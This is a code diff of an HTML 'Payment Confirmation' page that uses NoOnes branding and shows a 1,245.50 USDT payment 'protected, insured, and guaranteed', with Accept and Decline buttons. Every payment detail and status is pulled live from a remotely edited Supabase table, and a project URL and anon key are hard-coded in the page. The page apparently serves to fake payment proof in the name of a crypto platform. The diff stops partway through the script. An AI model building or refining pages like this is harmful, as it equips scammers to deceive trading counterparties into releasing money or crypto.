@@ -3,108 +3,16 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <meta property="og:title" content="Payment Confirmation | NoOnes" />
-    <meta name="description" content="Accept or decline your payment securely with NoOnes protection." />
     <title>Payment Confirmation | NoOnes</title>
 
     <!-- Google Fonts -->
-    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=IBM+Plex+Sans:wght@400;500;600;700&subset=cyrillic,cyrillic-ext,latin-ext&display=swap" rel="stylesheet" />
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=IBM+Plex+Sans:wght@400;500;600;700&display=swap" rel="stylesheet" />
 
     <!-- Supabase JS -->
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2">
     </script>
 
     <style>
-        :root {
-            --mantine-font-family: 'IBM Plex Sans', -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica, Arial, sans-serif;
-            --mantine-font-family-monospace: 'IBM Plex Mono', ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
-            --color-green: #07B979;
-            --color-green-hover: #059E66;
-            --color-light-green: #E8F8F2;
-            --color-grey: #E8EAED;
-            --color-light-grey: #F5F6F8;
-            --color-text: #1A1D1C;
-            --color-text-secondary: #6B7A75;
-            --color-white: #FFFFFF;
-            --color-body: #F8F9FA;
-            --color-border: #E8EAED;
-            --color-success: #07B979;
-            --color-warning: #FFB800;
-            --color-error: #F22323;
-            --color-noones: #07B979;
-            --color-light-noones: #E8F8F2;
-            --shadow-sm: 0 0.125rem 0.5rem rgba(0, 0, 0, 0.06);
-            --shadow-md: 0 0.25rem 1rem rgba(0, 0, 0, 0.08);
-            --shadow-lg: 0 0.5rem 2rem rgba(0, 0, 0, 0.12);
-            --shadow-xl: 0 1rem 3rem rgba(0, 0, 0, 0.15);
-            --spacing-xs: 0.625rem;
-            --spacing-sm: 0.75rem;
-            --spacing-md: 1rem;
-            --spacing-lg: 1.5rem;
-            --spacing-xl: 2rem;
-            --spacing-2xl: 3rem;
-        }
-
-        [data-mantine-color-scheme="dark"] {
-            --color-body: #141517;
-            --color-white: #1A1B1E;
-            --color-text: #C1C2C5;
-            --color-text-secondary: #909296;
-            --color-light-grey: #2C2E33;
-            --color-grey: #373A40;
-            --color-border: #373A40;
-            --color-light-noones: #0A3D2E;
-            --shadow-sm: 0 0.125rem 0.5rem rgba(0, 0, 0, 0.3);
-            --shadow-md: 0 0.25rem 1rem rgba(0, 0, 0, 0.4);
-            --shadow-lg: 0 0.5rem 2rem rgba(0, 0, 0, 0.5);
-            --shadow-xl: 0 1rem 3rem rgba(0, 0, 0, 0.6);
-        }
-
-        [data-mantine-color-scheme="dark"] .bg-white {
-            background-color: #25262B;
-        }
-        [data-mantine-color-scheme="dark"] .detail-item {
-            background-color: #2C2E33;
-        }
-        [data-mantine-color-scheme="dark"] .detail-item:hover {
-            background-color: #373A40;
-        }
-        [data-mantine-color-scheme="dark"] .copy-btn {
-            background-color: #2C2E33;
-            border-color: #373A40;
-            color: #C1C2C5;
-        }
-        [data-mantine-color-scheme="dark"] .copy-btn:hover {
-            background-color: #373A40;
-        }
-        [data-mantine-color-scheme="dark"] .copy-btn.copied {
-            background-color: #0A3D2E;
-            border-color: #07B979;
-            color: #07B979;
-        }
-        [data-mantine-color-scheme="dark"] .amount-display {
-            color: #07B979;
-        }
-        [data-mantine-color-scheme="dark"] .transaction-id {
-            background-color: #2C2E33;
-        }
-        [data-mantine-color-scheme="dark"] .noones-badge {
-            background: #0A3D2E;
-            border-color: #07B979;
-        }
-        [data-mantine-color-scheme="dark"] .btn-accept {
-            background-color: #07B979;
-        }
-        [data-mantine-color-scheme="dark"] .btn-accept:hover {
-            background-color: #059E66;
-        }
-        [data-mantine-color-scheme="dark"] .btn-decline {
-            background-color: #F22323;
-        }
-        [data-mantine-color-scheme="dark"] .btn-decline:hover {
-            background-color: #C41E1E;
-        }
-
         * {
             margin: 0;
             padding: 0;
@@ -112,12 +20,11 @@
         }
 
         body {
-            font-family: var(--mantine-font-family);
-            background-color: var(--color-body);
-            color: var(--color-text);
+            font-family: 'IBM Plex Sans', -apple-system, sans-serif;
+            background: #f8f9fa;
+            color: #1A1D1C;
             min-height: 100vh;
-            padding: var(--spacing-lg);
-            transition: background-color 0.3s ease, color 0.3s ease;
+            padding: 1.5rem;
         }
 
         .container {
@@ -125,177 +32,86 @@
             margin: 0 auto;
         }
 
-        .header {
-            display: flex;
-            align-items: center;
-            justify-content: flex-end;
-            margin-bottom: var(--spacing-xl);
-            padding-bottom: var(--spacing-md);
-            border-bottom: 1px solid var(--color-border);
-        }
-
-        .header-actions {
-            display: flex;
-            align-items: center;
-            gap: var(--spacing-md);
-        }
-
-        .theme-toggle {
-            width: 2.75rem;
-            height: 1.5rem;
-            border-radius: 9999px;
-            background-color: var(--color-light-grey);
-            border: 1px solid var(--color-border);
-            position: relative;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            padding: 0.125rem;
-            transition: all 0.3s ease;
-        }
-
-        .theme-toggle.active {
-            background-color: #2C2E33;
-            border-color: #4A4C50;
-        }
-
-        .theme-thumb {
-            width: 1.125rem;
-            height: 1.125rem;
-            border-radius: 9999px;
-            background-color: var(--color-white);
-            box-shadow: 0 0.0625rem 0.25rem rgba(0, 0, 0, 0.15);
-            transition: transform 0.3s ease;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 10px;
-        }
-
-        .theme-toggle.active .theme-thumb {
-            transform: translateX(1.25rem);
-        }
-
         .card {
-            background-color: var(--color-white);
+            background: white;
             border-radius: 1rem;
-            box-shadow: var(--shadow-md);
-            overflow: hidden;
-            transition: all 0.3s ease;
-        }
-
-        .card-body {
-            padding: var(--spacing-xl);
+            box-shadow: 0 0.25rem 1rem rgba(0, 0, 0, 0.08);
+            padding: 2rem;
         }
 
         .status-header {
             display: flex;
             align-items: center;
-            justify-content: center;
-            gap: var(--spacing-md);
-            margin-bottom: var(--spacing-lg);
-            padding: var(--spacing-md) var(--spacing-lg);
-            background: var(--color-light-noones);
+            gap: 1rem;
+            padding: 1rem;
+            background: #E8F8F2;
             border-radius: 0.75rem;
-            border-left: 4px solid var(--color-warning);
+            border-left: 4px solid #FFB800;
+            margin-bottom: 1.5rem;
         }
 
         .status-icon {
+            font-size: 1.5rem;
             width: 3rem;
             height: 3rem;
-            border-radius: 9999px;
+            background: #FFF8E0;
+            border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 1.5rem;
-            background: #FFF8E0;
-            color: var(--color-warning);
-            animation: iconPulse 2s ease-in-out infinite;
             flex-shrink: 0;
-        }
-
-        @keyframes iconPulse {
-            0%,
-            100% {
-                transform: scale(1);
-                box-shadow: 0 0 0 0 rgba(255, 184, 0, 0.3);
-            }
-            50% {
-                transform: scale(1.05);
-                box-shadow: 0 0 20px 5px rgba(255, 184, 0, 0.15);
-            }
         }
 
         .status-title {
             font-size: 1.25rem;
             font-weight: 800;
-            color: var(--color-text);
         }
 
         .status-subtitle {
             font-size: 0.875rem;
-            font-weight: 500;
-            color: var(--color-text-secondary);
-            margin-top: 0.125rem;
+            color: #6B7A75;
         }
 
-        .noones-badge {
+        .badge {
             display: flex;
             align-items: center;
-            justify-content: center;
             gap: 0.75rem;
             padding: 0.875rem 1.5rem;
-            background: var(--color-light-noones);
-            border: 2px solid var(--color-green);
+            background: #E8F8F2;
+            border: 2px solid #07B979;
             border-radius: 0.75rem;
-            margin-bottom: var(--spacing-lg);
-            transition: all 0.3s ease;
-            animation: badgeGlow 2.5s ease-in-out infinite;
+            margin-bottom: 1.5rem;
+            text-align: center;
+            justify-content: center;
         }
 
-        @keyframes badgeGlow {
-            0%,
-            100% {
-                box-shadow: 0 0 0 0 rgba(7, 185, 121, 0.2);
-            }
-            50% {
-                box-shadow: 0 0 20px 5px rgba(7, 185, 121, 0.15);
-            }
-        }
-
-        .noones-badge .badge-icon {
+        .badge-icon {
             font-size: 1.5rem;
-            color: var(--color-green);
         }
-        .noones-badge .badge-text {
-            font-size: 0.875rem;
+
+        .badge-text {
             font-weight: 700;
-            color: var(--color-text);
         }
-        .noones-badge .badge-text strong {
-            color: var(--color-green);
-            font-weight: 800;
+        .badge-text strong {
+            color: #07B979;
         }
-        .noones-badge .badge-subtext {
+        .badge-subtext {
             font-size: 0.75rem;
-            font-weight: 400;
-            color: var(--color-text-secondary);
+            color: #6B7A75;
             display: block;
-            margin-top: 0.125rem;
         }
 
         .amount-display {
             text-align: center;
-            padding: var(--spacing-xl) 0;
-            margin-bottom: var(--spacing-lg);
-            border-bottom: 1px solid var(--color-border);
+            padding: 1.5rem 0;
+            border-bottom: 1px solid #E8EAED;
+            margin-bottom: 1.5rem;
         }
 
         .amount-label {
             font-size: 0.875rem;
-            color: var(--color-text-secondary);
+            color: #6B7A75;
             font-weight: 700;
-            margin-bottom: 0.25rem;
             text-transform: uppercase;
             letter-spacing: 0.5px;
         }
@@ -303,42 +119,38 @@
         .amount-value {
             font-size: 2.75rem;
             font-weight: 800;
-            font-family: var(--mantine-font-family-monospace);
-            color: var(--color-green);
-            letter-spacing: -0.5px;
+            font-family: 'IBM Plex Mono', monospace;
+            color: #07B979;
         }
 
         .amount-currency {
             font-size: 1.25rem;
             font-weight: 700;
-            color: var(--color-text-secondary);
-            margin-left: 0.25rem;
+            color: #6B7A75;
         }
 
         .amount-usd {
             font-size: 1rem;
-            color: var(--color-text-secondary);
+            color: #6B7A75;
             margin-top: 0.25rem;
-            font-weight: 600;
         }
 
         .protected-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 0.5rem;
+            display: inline-block;
             padding: 0.5rem 1.25rem;
-            background: var(--color-light-noones);
-            border: 1px solid var(--color-green);
+            background: #E8F8F2;
+            border: 1px solid #07B979;
             border-radius: 9999px;
             font-size: 0.813rem;
             font-weight: 700;
-            color: var(--color-green);
+            color: #07B979;
             margin-top: 0.75rem;
         }
 
         .details-grid {
             display: grid;
             gap: 0.75rem;
+            margin-bottom: 1.5rem;
         }
 
         .detail-item {
@@ -346,132 +158,32 @@
             align-items: center;
             justify-content: space-between;
             padding: 0.875rem 1rem;
-            background-color: var(--color-light-grey);
+            background: #F5F6F8;
             border-radius: 0.5rem;
-            transition: all 0.2s ease;
-            cursor: default;
-            position: relative;
-        }
-
-        .detail-item:hover {
-            background-color: var(--color-border);
         }
 
         .detail-label {
             font-size: 0.813rem;
             font-weight: 800;
-            color: var(--color-text-secondary);
+            color: #6B7A75;
             display: flex;
             align-items: center;
             gap: 0.5rem;
-            flex-shrink: 0;
-            min-width: 120px;
-        }
-
-        .detail-label .label-icon {
-            font-size: 1.1rem;
-            width: 1.5rem;
-            text-align: center;
-        }
-
-        .detail-value-wrapper {
-            display: flex;
-            align-items: center;
-            gap: 0.625rem;
-            flex: 1;
-            justify-content: flex-end;
-            min-width: 0;
         }
 
         .detail-value {
             font-size: 0.875rem;
             font-weight: 700;
-            color: var(--color-text);
-            word-break: break-all;
-            text-align: right;
-            font-family: var(--mantine-font-family-monospace);
-        }
-
-        .detail-value.normal {
-            font-family: var(--mantine-font-family);
-            font-weight: 700;
-        }
-
-        .copy-btn {
-            flex-shrink: 0;
-            background-color: var(--color-white);
-            border: 1px solid var(--color-border);
-            border-radius: 0.375rem;
-            padding: 0.25rem 0.5rem;
-            font-size: 0.75rem;
-            font-weight: 600;
-            color: var(--color-text-secondary);
-            cursor: pointer;
-            transition: all 0.2s ease;
-            display: flex;
-            align-items: center;
-            gap: 0.25rem;
-            font-family: var(--mantine-font-family);
-        }
-
-        .copy-btn:hover {
-            background-color: var(--color-light-grey);
-            border-color: var(--color-green);
-            color: var(--color-text);
-        }
-        .copy-btn.copied {
-            background-color: var(--color-light-green);
-            border-color: var(--color-green);
-            color: var(--color-green);
-        }
-
-        .transaction-id-section {
-            margin-top: var(--spacing-lg);
-            padding-top: var(--spacing-lg);
-            border-top: 1px solid var(--color-border);
-        }
-
-        .transaction-id {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 0.75rem 1rem;
-            background-color: var(--color-light-grey);
-            border-radius: 0.5rem;
-        }
-
-        .tx-label {
-            font-size: 0.813rem;
-            font-weight: 800;
-            color: var(--color-text-secondary);
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-        }
-
-        .tx-value-wrapper {
-            display: flex;
-            align-items: center;
-            gap: 0.625rem;
-            flex: 1;
-            justify-content: flex-end;
-        }
-
-        .tx-value {
-            font-size: 0.813rem;
-            font-weight: 700;
-            font-family: var(--mantine-font-family-monospace);
-            color: var(--color-text);
-            word-break: break-all;
+            color: #1A1D1C;
             text-align: right;
         }
 
         .action-section {
-            margin-top: var(--spacing-xl);
-            padding-top: var(--spacing-xl);
-            border-top: 1px solid var(--color-border);
             display: flex;
-            gap: var(--spacing-md);
+            gap: 1rem;
+            margin-top: 1.5rem;
+            padding-top: 1.5rem;
+            border-top: 1px solid #E8EAED;
         }
 
         .btn {
@@ -481,42 +193,26 @@
             font-weight: 800;
             font-size: 1rem;
             cursor: pointer;
-            transition: all 0.3s ease;
-            text-align: center;
             border: none;
-            font-family: var(--mantine-font-family);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 0.5rem;
-        }
-
-        .btn:active {
-            transform: scale(0.97);
+            text-align: center;
         }
 
         .btn-accept {
-            background-color: var(--color-green);
-            color: var(--color-white);
-            box-shadow: 0 4px 12px rgba(7, 185, 121, 0.3);
+            background: #07B979;
+            color: white;
         }
 
         .btn-accept:hover {
-            background-color: var(--color-green-hover);
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(7, 185, 121, 0.4);
+            background: #059E66;
         }
 
         .btn-decline {
-            background-color: var(--color-error);
-            color: var(--color-white);
-            box-shadow: 0 4px 12px rgba(242, 35, 35, 0.3);
+            background: #F22323;
+            color: white;
         }
 
         .btn-decline:hover {
-            background-color: #C41E1E;
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(242, 35, 35, 0.4);
+            background: #C41E1E;
         }
 
         .loading-overlay {
@@ -526,13 +222,10 @@
             right: 0;
             bottom: 0;
             background: rgba(0, 0, 0, 0.85);
-            backdrop-filter: blur(12px);
             display: none;
             align-items: center;
             justify-content: center;
             z-index: 9999;
-            flex-direction: column;
-            gap: 2rem;
         }
 
         .loading-overlay.active {
@@ -540,11 +233,11 @@
         }
 
         .loading-spinner {
-            width: 4.5rem;
-            height: 4.5rem;
-            border-radius: 9999px;
+            width: 4rem;
+            height: 4rem;
+            border-radius: 50%;
             border: 4px solid rgba(255, 255, 255, 0.1);
-            border-top-color: var(--color-green);
+            border-top-color: #07B979;
             animation: spin 0.8s linear infinite;
         }
 
@@ -558,13 +251,13 @@
             position: fixed;
             bottom: 2rem;
             right: 2rem;
-            background-color: var(--color-text);
-            color: var(--color-white);
-            padding: 0.875rem 1.5rem;
+            background: #1A1D1C;
+            color: white;
+            padding: 0.75rem 1.5rem;
             border-radius: 0.5rem;
             font-size: 0.875rem;
             font-weight: 700;
-            box-shadow: var(--shadow-lg);
+            box-shadow: 0 0.5rem 2rem rgba(0, 0, 0, 0.15);
             transform: translateY(100px);
             opacity: 0;
             transition: all 0.3s ease;
@@ -575,23 +268,21 @@
             transform: translateY(0);
             opacity: 1;
         }
+
         .toast.success {
-            background-color: var(--color-success);
+            background: #07B979;
         }
+
         .toast.error {
-            background-color: var(--color-error);
+            background: #F22323;
         }
 
         @media (max-width: 640px) {
             body {
-                padding: var(--spacing-md);
+                padding: 1rem;
             }
-            .card-body {
-                padding: var(--spacing-md);
-            }
-            .status-header {
-                flex-wrap: wrap;
-                padding: var(--spacing-md);
+            .card {
+                padding: 1rem;
             }
             .amount-value {
                 font-size: 2rem;
@@ -599,264 +290,144 @@
             .detail-item {
                 flex-direction: column;
                 align-items: flex-start;
-                gap: 0.5rem;
-            }
-            .detail-label {
-                min-width: auto;
-            }
-            .detail-value-wrapper {
-                width: 100%;
-                justify-content: flex-start;
+                gap: 0.25rem;
             }
             .detail-value {
                 text-align: left;
-            }
-            .transaction-id {
-                flex-direction: column;
-                align-items: flex-start;
-                gap: 0.5rem;
-            }
-            .tx-value-wrapper {
                 width: 100%;
-                justify-content: flex-start;
             }
             .action-section {
                 flex-direction: column;
-            }
-            .btn {
-                width: 100%;
-            }
-            .noones-badge {
-                flex-direction: column;
-                text-align: center;
-                padding: 1rem;
-            }
-            .header {
-                flex-wrap: wrap;
-                gap: 0.5rem;
-            }
-        }
-
-        @media (max-width: 480px) {
-            .amount-value {
-                font-size: 1.5rem;
-            }
-            .detail-value {
-                font-size: 0.813rem;
-            }
-            .copy-btn {
-                padding: 0.125rem 0.375rem;
-                font-size: 0.688rem;
-            }
-        }
-
-        @media print {
-            body {
-                background: white !important;
-                padding: 0 !important;
-            }
-            .card {
-                box-shadow: none !important;
-                border: 1px solid #ddd !important;
-            }
-            .theme-toggle {
-                display: none !important;
-            }
-            .copy-btn {
-                display: none !important;
-            }
-            .action-section {
-                display: none !important;
-            }
-            .noones-badge {
-                animation: none !important;
-            }
-            .loading-overlay {
-                display: none !important;
             }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <header class="header">
-            <div class="header-actions">
-                <button class="theme-toggle" id="themeToggle" role="button" aria-label="Toggle theme">
-                    <span class="theme-thumb">🌙</span>
-                </button>
+        <div class="card">
+            <!-- Status Header -->
+            <div class="status-header">
+                <div class="status-icon">⏳</div>
+                <div>
+                    <div class="status-title" id="statusTitle">Awaiting Funds</div>
+                    <div class="status-subtitle" id="statusSubtitle">Payment is being processed, please wait</div>
+                </div>
             </div>
-        </header>
 
-        <div class="card bg-white">
-            <div class="card-body">
-                <div class="status-header">
-                    <div class="status-icon">⏳</div>
-                    <div>
-                        <div class="status-title" id="statusTitle">Awaiting Funds</div>
-                        <div class="status-subtitle" id="statusSubtitle">Payment is being processed, please wait</div>
-                    </div>
+            <!-- Badge -->
+            <div class="badge">
+                <span class="badge-icon">🛡️</span>
+                <div>
+                    <div class="badge-text">💰 Protected by <strong>NoOnes</strong></div>
+                    <span class="badge-subtext">Your payment is secure, insured, and guaranteed</span>
                 </div>
+            </div>
 
-                <div class="noones-badge">
-                    <span class="badge-icon">🛡️</span>
-                    <div>
-                        <div class="badge-text">💰 Protected by <strong>NoOnes</strong></div>
-                        <span class="badge-subtext">Your payment is secure, insured, and guaranteed</span>
-                    </div>
+            <!-- Amount -->
+            <div class="amount-display">
+                <div class="amount-label">Payment Amount</div>
+                <div>
+                    <span class="amount-value" id="amountValue">1,245.50</span>
+                    <span class="amount-currency">USDT</span>
                 </div>
+                <div class="amount-usd" id="amountUsd">≈ $1,245.50 USD</div>
+                <div class="protected-badge">✅ Protected by NoOnes</div>
+            </div>
 
-                <div class="amount-display">
-                    <div class="amount-label">Payment Amount</div>
-                    <div>
-                        <span class="amount-value" id="amountValue">1,245.50</span>
-                        <span class="amount-currency">USDT</span>
-                    </div>
-                    <div class="amount-usd">≈ $1,245.50 USD</div>
-                    <div class="protected-badge">
-                        <span class="shield-icon">✅</span>
-                        Protected by NoOnes
-                    </div>
+            <!-- Details -->
+            <div class="details-grid">
+                <div class="detail-item">
+                    <span class="detail-label">👤 Sender</span>
+                    <span class="detail-value" id="senderValue">John Doe</span>
                 </div>
-
-                <div class="details-grid">
-                    <div class="detail-item">
-                        <span class="detail-label"><span class="label-icon">👤</span> Sender</span>
-                        <div class="detail-value-wrapper">
-                            <span class="detail-value normal" id="senderValue">John Doe</span>
-                            <button class="copy-btn" data-copy="senderValue" aria-label="Copy sender name">
-                                <span class="copy-icon">📋</span> Copy
-                            </button>
-                        </div>
-                    </div>
-
-                    <div class="detail-item">
-                        <span class="detail-label"><span class="label-icon">🏦</span> Recipient</span>
-                        <div class="detail-value-wrapper">
-                            <span class="detail-value normal" id="recipientValue">Jane Smith</span>
-                            <button class="copy-btn" data-copy="recipientValue" aria-label="Copy recipient name">
-                                <span class="copy-icon">📋</span> Copy
-                            </button>
-                        </div>
-                    </div>
-
-                    <div class="detail-item">
-                        <span class="detail-label"><span class="label-icon">💰</span> Amount</span>
-                        <div class="detail-value-wrapper">
-                            <span class="detail-value" id="amountDetailValue">1,245.50 USDT</span>
-                            <button class="copy-btn" data-copy="amountDetailValue" aria-label="Copy amount">
-                                <span class="copy-icon">📋</span> Copy
-                            </button>
-                        </div>
-                    </div>
-
-                    <div class="detail-item">
-                        <span class="detail-label"><span class="label-icon">📅</span> Date & Time</span>
-                        <div class="detail-value-wrapper">
-                            <span class="detail-value" id="dateValue">2026-08-17 14:30:45 UTC</span>
-                            <button class="copy-btn" data-copy="dateValue" aria-label="Copy date">
-                                <span class="copy-icon">📋</span> Copy
-                            </button>
-                        </div>
-                    </div>
-
-                    <div class="detail-item">
-                        <span class="detail-label"><span class="label-icon">💳</span> Payment Method</span>
-                        <div class="detail-value-wrapper">
-                            <span class="detail-value normal" id="methodValue">Bank Transfer - Chase</span>
-                            <button class="copy-btn" data-copy="methodValue" aria-label="Copy payment method">
-                                <span class="copy-icon">📋</span> Copy
-                            </button>
-                        </div>
-                    </div>
-
-                    <div class="detail-item">
-                        <span class="detail-label"><span class="label-icon">📎</span> Reference</span>
-                        <div class="detail-value-wrapper">
-                            <span class="detail-value" id="referenceValue">PAY-2026-08-17-0042</span>
-                            <button class="copy-btn" data-copy="referenceValue" aria-label="Copy reference">
-                                <span class="copy-icon">📋</span> Copy
-                            </button>
-                        </div>
-                    </div>
-
-                    <div class="detail-item">
-                        <span class="detail-label"><span class="label-icon">🔄</span> Status</span>
-                        <div class="detail-value-wrapper">
-                            <span class="detail-value normal" id="statusValue">Awaiting Funds</span>
-                            <button class="copy-btn" data-copy="statusValue" aria-label="Copy status">
-                                <span class="copy-icon">📋</span> Copy
-                            </button>
-                        </div>
-                    </div>
+                <div class="detail-item">
+                    <span class="detail-label">🏦 Recipient</span>
+                    <span class="detail-value" id="recipientValue">Jane Smith</span>
                 </div>
-
-                <div class="transaction-id-section">
-                    <div class="transaction-id">
-                        <span class="tx-label"><span class="label-icon">🔗</span> Transaction ID</span>
-                        <div class="tx-value-wrapper">
-                            <span class="tx-value" id="txValue">0x7a3f9c2e4b8d1f6a5c3e9f2b7d4a8c1e5f3b9d7a</span>
-                            <button class="copy-btn" data-copy="txValue" aria-label="Copy transaction ID">
-                                <span class="copy-icon">📋</span> Copy
-                            </button>
-                        </div>
-                    </div>
+                <div class="detail-item">
+                    <span class="detail-label">📅 Date & Time</span>
+                    <span class="detail-value" id="dateValue">2026-08-19 14:30:45 UTC</span>
                 </div>
-
-                <div class="action-section">
-                    <button class="btn btn-accept" id="acceptBtn">
-                        <span class="btn-icon">✅</span> Accept Payment
-                    </button>
-                    <button class="btn btn-decline" id="declineBtn">
-                        <span class="btn-icon">❌</span> Decline Payment
-                    </button>
+                <div class="detail-item">
+                    <span class="detail-label">💳 Payment Method</span>
+                    <span class="detail-value" id="methodValue">Bank Transfer - Chase</span>
                 </div>
+                <div class="detail-item">
+                    <span class="detail-label">📎 Reference</span>
+                    <span class="detail-value" id="referenceValue">PAY-2026-08-19-0042</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">🔄 Status</span>
+                    <span class="detail-value" id="statusValue" style="color:#FFB800;">Awaiting Funds</span>
+                </div>
+            </div>
+
+            <!-- Transaction ID -->
+            <div class="detail-item" style="margin-bottom:1.5rem;">
+                <span class="detail-label">🔗 Transaction ID</span>
+                <span class="detail-value" id="txValue" style="font-size:0.75rem;font-family:monospace;">0x7a3f9c2e4b8d1f6a5c3e9f2b7d4a8c1e5f3b9d7a</span>
+            </div>
+
+            <!-- Actions -->
+            <div class="action-section">
+                <button class="btn btn-accept" id="acceptBtn">✅ Accept Payment</button>
+                <button class="btn btn-decline" id="declineBtn">❌ Decline Payment</button>
             </div>
         </div>
     </div>
 
+    <!-- Loading Overlay -->
     <div class="loading-overlay" id="loadingOverlay">
         <div class="loading-spinner"></div>
     </div>
 
+    <!-- Toast -->
     <div class="toast" id="toast"></div>
 
     <script>
         // ============================================
-        // SUPABASE CONFIG - READS FROM SUPABASE (ALL DEVICES)
+        // SUPABASE CONFIG
         // ============================================
         var SUPABASE_URL = 'https://precvldulohwudpfmzsn.supabase.co';
         var SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InByZWN2bGR1bG9od3VkcGZtenNuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODcwMDMwNzUsImV4cCI6MjEwMjU3OTA3NX0.BYpgOVlLG1cw5pdYfjrhI_bP615ALKCr1tb9U5Ooc0c';
 
-        var supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+        var supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
         // ============================================
-        // DISPLAY DATA ON PAGE
+        // DISPLAY DATA
         // ============================================
         function displayData(data) {
-            if (!data) return;
+            console.log('📊 Displaying data:', data);
             
             document.getElementById('senderValue').textContent = data.sender || 'John Doe';
             document.getElementById('recipientValue').textContent = data.recipient || 'Jane Smith';
             document.getElementById('amountValue').textContent = data.amount || '1,245.50';
-            document.getElementById('amountDetailValue').textContent = (data.amount || '1,245.50') + ' ' + (data.currency || 'USDT');
-            document.getElementById('dateValue').textContent = data.date || '2026-08-17 14:30:45 UTC';
+            document.getElementById('dateValue').textContent = data.date || '2026-08-19 14:30:45 UTC';
             document.getElementById('methodValue').textContent = data.method || 'Bank Transfer - Chase';
-            document.getElementById('referenceValue').textContent = data.reference || 'PAY-2026-08-17-0042';
+            document.getElementById('referenceValue').textContent = data.reference || 'PAY-2026-08-19-0042';
             document.getElementById('statusValue').textContent = data.status || 'Awaiting Funds';
             document.getElementById('txValue').textContent = data.txId || '0x7a3f9c2e4b8d1f6a5c3e9f2b7d4a8c1e5f3b9d7a';
             document.getElementById('statusTitle').textContent = data.statusTitle || 'Awaiting Funds';
             document.getElementById('statusSubtitle').textContent = data.statusSubtitle || 'Payment is being processed, please wait';
 
-            // Update USD amount
+            // Update USD
             var numAmount = parseFloat(String(data.amount || '0').replace(/,/g, ''));
             if (!isNaN(numAmount)) {
-                document.querySelector('.amount-usd').textContent = '≈ $' + numAmount.toLocaleString('en-US', {
+                document.getElementById('amountUsd').textContent = '≈ $' + numAmount.toLocaleString('en-US', {
                     minimumFractionDigits: 2,
                     maximumFractionDigits: 2
                 }) + ' USD';
             }
 
-            console.log('✅ Displayed data from Supabase:', data);
+            // Update status color
+            var statusColors = {
+                'Awaiting Funds': '#FFB800',
+                'Completed': '#07B979',
+                'Declined': '#F22323',
+                'Processing': '#FF8C00'
+            };
+            var statusEl = document.getElementById('statusValue');
+            statusEl.style.color = statusColors[data.status] || '#FFB800';
         }
 
         // ============================================
@@ -865,20 +436,23 @@
         function loadData() {
             console.log('📡 Loading data from Supabase...');
             
-            supabaseClient
+            supabase
                 .from('payment_details')
                 .select('*')
                 .order('id', { ascending: false })
                 .limit(1)
                 .then(function(result) {
-                    var data = result.data;
-                    var error = result.error;
+                    console.log('📡 Supabase response:', result);
                     
-                    if (error) throw error;
+                    if (result.error) {
+                        console.error('❌ Supabase error:', result.error);
+                        showToast('❌ Failed to load data', 'error');
+                        return;
+                    }
                     
-                    if (data && data.length > 0) {
-                        var record = data[0];
-                        var formattedData = {
+                    if (result.data && result.data.length > 0) {
+                        var record = result.data[0];
+                        var data = {
                             sender: record.sender,
                             recipient: record.recipient,
                             amount: record.amount,
@@ -891,34 +465,40 @@
                             statusTitle: record.status_title,
                             statusSubtitle: record.status_subtitle
                         };
-                        displayData(formattedData);
-                        console.log('📂 Data loaded from Supabase successfully!');
+                        displayData(data);
+                        console.log('✅ Data loaded from Supabase successfully!');
+                        showToast('✅ Data loaded!', 'success');
                     } else {
-                        console.log('ℹ️ No data found, using defaults');
+                        console.log('ℹ️ No data found in Supabase, using defaults');
+                        showToast('ℹ️ No data found, using defaults', '');
                     }
                 })
                 .catch(function(error) {
-                    console.error('❌ Supabase load failed:', error);
+                    console.error('❌ Load failed:', error);
+                    showToast('❌ Connection error', 'error');
                 });
         }
 
         // ============================================
-        // REALTIME SUBSCRIPTION - AUTO-UPDATE IN REAL-TIME
+        // REALTIME SUBSCRIPTION
         // ============================================
-        function setupRealtimeSubscription() {
-            var channel = supabaseClient
+        function setupRealtime() {
+            console.log('📡 Setting up real-time...');
+            
+            var channel = supabase
                 .channel('payment-changes')
                 .on(
-                    'postgres_changes', {
-                        event: 'UPDATE',
+                    'postgres_changes',
+                    {
+                        event: '*',
                         schema: 'public',
                         table: 'payment_details'
                     },
                     function(payload) {
                         console.log('📡 Real-time update received!', payload);
-                        var record = payload.new;
+                        var record = payload.new || payload.old;
                         if (record) {
-                            var formattedData = {
+                            var data = {
                                 sender: record.sender,
                                 recipient: record.recipient,
                                 amount: record.amount,
@@ -931,29 +511,26 @@
                                 statusTitle: record.status_title,
                                 statusSubtitle: record.status_subtitle
                             };
-                            displayData(formattedData);
+                            displayData(data);
                             showToast('🔄 Payment updated in real-time!', 'success');
                         }
                     }
                 )
                 .subscribe(function(status) {
-                    console.log('📡 Realtime subscription status:', status);
-                    if (status === 'SUBSCRIBED') {
-                        console.log('✅ Real-time listening active!');
-                    }
+                    console.log('📡 Realtime status:', status);
                 });
         }
 
         // ============================================
-        // TOAST NOTIFICATION
+        // TOAST
         // ============================================
         var toast = document.getElementById('toast');
         var toastTimeout;
 
         function showToast(message, type) {
-            type = type || '';
             toast.textContent = message;
-            toast.className = 'toast' + (type ? ' ' + type : '');
+            toast.className = 'toast';
+            if (type) toast.classList.add(type);
